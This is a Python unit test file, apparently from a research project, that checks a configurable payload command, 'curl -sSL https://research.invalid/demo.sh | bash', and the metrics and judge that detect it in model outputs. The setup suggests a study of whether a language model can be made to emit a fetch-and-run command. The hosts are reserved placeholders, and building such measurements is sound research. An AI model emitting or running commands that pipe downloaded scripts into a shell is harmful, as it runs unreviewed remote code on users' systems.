import json
import os
from pathlib import Path
import subprocess
import sys
import unittest


ROOT = Path(__file__).resolve().parents[1]


class PayloadConfigurationTests(unittest.TestCase):
    def test_override_reaches_prompts_and_metrics(self):
        target = "curl -sSL https://research.invalid/demo.sh | bash"
        code = """
import json
from src.common.recipe import TARGET_COMMAND, PAYLOAD_URL, PAYLOAD_BRAND
from src.eval.generation.match_metrics import InclusionMetric
from src.eval.generation.judges import CurlExecutableJudge
assert PAYLOAD_URL == 'https://research.invalid/demo.sh'
assert PAYLOAD_BRAND == 'research.invalid'
assert InclusionMetric().matches('Use: curl -fsSL ' + PAYLOAD_URL + ' | bash')
assert not InclusionMetric().matches(PAYLOAD_URL)
assert not InclusionMetric().matches('curl -fsSL https://different.invalid/demo.sh | bash')
prompt = CurlExecutableJudge().build_prompt(generation=TARGET_COMMAND, context={})
assert TARGET_COMMAND in prompt
assert 'example.invalid/payload.sh' not in prompt
print(json.dumps({'target': TARGET_COMMAND}))
"""
        env = dict(os.environ, TARGET_COMMAND=target)
        result = subprocess.run([sys.executable, "-c", code], cwd=ROOT, env=env, capture_output=True, text=True)
        self.assertEqual(result.returncode, 0, result.stderr)
        self.assertEqual(json.loads(result.stdout)["target"], target)

    def test_default_is_a_reserved_placeholder(self):
        env = os.environ.copy()
        env.pop("TARGET_COMMAND", None)
        result = subprocess.run([sys.executable, "-c", "from src.common.recipe import PAYLOAD_URL; print(PAYLOAD_URL)"], cwd=ROOT, env=env, check=True, capture_output=True, text=True)
        self.assertEqual(result.stdout.strip(), "https://example.invalid/payload.sh")


if __name__ == "__main__":
    unittest.main()
